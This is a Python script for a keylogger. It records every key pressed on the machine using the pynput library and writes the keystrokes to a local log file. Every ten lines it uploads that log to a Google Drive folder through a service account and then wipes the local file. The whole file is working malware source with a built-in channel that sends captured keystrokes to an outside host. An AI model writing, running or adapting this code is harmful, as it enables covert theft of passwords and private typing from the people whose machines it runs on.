import os
from pynput.keyboard import Listener
from google.oauth2 import service_account
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload

# Path to the log file
log_file_path = "keylogger.txt"  # Specify the log file name or path

# Google Drive API Setup
SCOPES = ['https://www.googleapis.com/auth/drive.file']
SERVICE_ACCOUNT_FILE = 'path/to/your/service-account-file.json'  # User should enter the path to their service account JSON file

credentials = service_account.Credentials.from_service_account_file(
    SERVICE_ACCOUNT_FILE, scopes=SCOPES)
service = build('drive', 'v3', credentials=credentials)

# Function to upload the file to Google Drive
def upload_to_drive(file_path):
    folder_id = "your_folder_id"  # User should enter the Google Drive folder ID where they want to upload the file
    file_metadata = {
        'name': 'keylogger.txt',
        'parents': [folder_id]  # Set the parent folder for the uploaded file
    }
    
    media = MediaFileUpload(file_path, mimetype='text/plain')
    
    # Upload the file
    file = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
    print(f"File uploaded to Google Drive with ID: {file.get('id')}")

# Function to count lines in the log file
def check_log_lines(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    return len(lines)

# Function to send log to Google Drive and reset the file if 10 lines are reached
def manage_log_file():
    if check_log_lines(log_file_path) >= 10:
        upload_to_drive(log_file_path)
        # Clear the log file after uploading
        with open(log_file_path, 'w') as file:
            file.write("")

# Function to write key logs to the file
def write_log(key):
    with open(log_file_path, 'a') as file:
        file.write(f'{key}\n')
    manage_log_file()

# Listener for key press events
def on_press(key):
    try:
        write_log(key.char)  # Write character keys
    except AttributeError:
        write_log(str(key))  # Write special keys (like space, shift)

# Start listening to the keyboard events
with Listener(on_press=on_press) as listener:
    listener.join()
